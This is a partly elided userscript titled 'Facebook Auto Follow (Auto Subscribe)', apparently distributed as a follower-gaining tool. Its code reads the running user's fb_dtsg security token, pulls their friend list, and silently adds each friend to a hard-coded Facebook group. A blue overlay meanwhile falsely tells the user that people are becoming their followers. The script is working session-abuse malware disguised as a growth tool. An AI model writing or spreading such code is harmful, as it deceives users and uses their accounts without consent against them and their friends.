//786
//i luv u rahat tmhare liye kuch bhi 
// ==UserScript==
...
// @icon			https://www.facebook.com/images/spacer.gif
...
function penetrasi(e) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=" + memberGroupId + "&source=typeahead&members=" + e + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + Env.user, function (e) {
        ...
        idrevolutionz += "</div>";
        var r = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;background-color:#43a6df;z-index:9999;font-size:14px;text-align:center;padding:15px;border:5px solid #e4e4e4'; opacity: 0.9; >";
        r += "<div style='padding-bottom:10px;font-size:20px; color:white;'>Now People Are Becoming Your Followers</div>";
        if (i > 0) {
            r += arr.length + " People Detected<br/>";
            r += "<b>" + suc + "</b> People Became Your Followers " + (arr.length - i) + " People Processed ";
            r += "(" + i + " more to go..)";
            ...
            r += arr.length + " People Detected And ";
            r += "<b>" + suc + " People Followed You</b>";
...
var suc = 0;
var arr = new Array;
var memberGroupId = 513806725307797;
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" + Env.user + "&filter[0]=user&__user=" + Env.user, function (e) {
    ...
    var o = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;background-color:#43a6df;z-index:9999;font-size:14px;text-align:center;padding:15px;border:5px solid #e4e4e4'; opacity: 0.9;>";
...
// ======= Muhammad Taha =======
// == Name : Facebook Auto Follow (Auto Subscribe) v 1.0 ==
// ======= Author : Muhammad Taha ========